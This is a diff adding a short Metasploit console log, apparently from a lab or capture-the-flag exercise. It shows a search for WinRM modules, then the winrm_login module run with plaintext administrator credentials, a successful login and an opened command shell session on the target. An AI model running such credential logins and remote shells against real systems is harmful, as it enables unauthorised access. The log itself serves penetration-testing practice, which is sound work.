@@ -1,0 +1,31 @@
+msfconsole
+
+[msf](Jobs:0 Agents:0) >> search winrm
+
+Matching Modules
+================
+
+   #  Name                                                 Disclosure Date  Rank    Check  Description
+   -  ----                                                 ---------------  ----    -----  -----------
+   0  exploit/windows/local/bits_ntlm_token_impersonation  2019-12-06       great   Yes    SYSTEM token impersonation through NTLM bits authentication on missing WinRM Service.
+   1  auxiliary/scanner/winrm/winrm_auth_methods                            normal  No     WinRM Authentication Method Detection
+   2  auxiliary/scanner/winrm/winrm_cmd                                     normal  No     WinRM Command Runner
+   3  auxiliary/scanner/winrm/winrm_login                                   normal  No     WinRM Login Utility
+   4  exploit/windows/winrm/winrm_script_exec              2012-11-01       manual  No     WinRM Script Exec Remote Code Execution
+   5  auxiliary/scanner/winrm/winrm_wql                                     normal  No     WinRM WQL Query Runner
+
+
+Interact with a module by name or index. For example info 5, use 5 or use auxiliary/scanner/winrm/winrm_wql
+
+[msf](Jobs:0 Agents:0) >> use 3
+
+[msf](Jobs:0 Agents:0) auxiliary(scanner/winrm/winrm_login) >> run http://administrator:badminton@10.129.101.14:5985
+
+[+] 10.129.101.14:5985 - Login Successful: WORKSTATION\administrator:badminton
+[*] Command shell session 1 opened (10.10.17.29:43759 -> 10.129.101.14:5985) at 2022-11-04 18:51:06 +0100
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+[msf](Jobs:0 Agents:1) auxiliary(scanner/winrm/winrm_login) >> sessions -i
+
+Already connected!
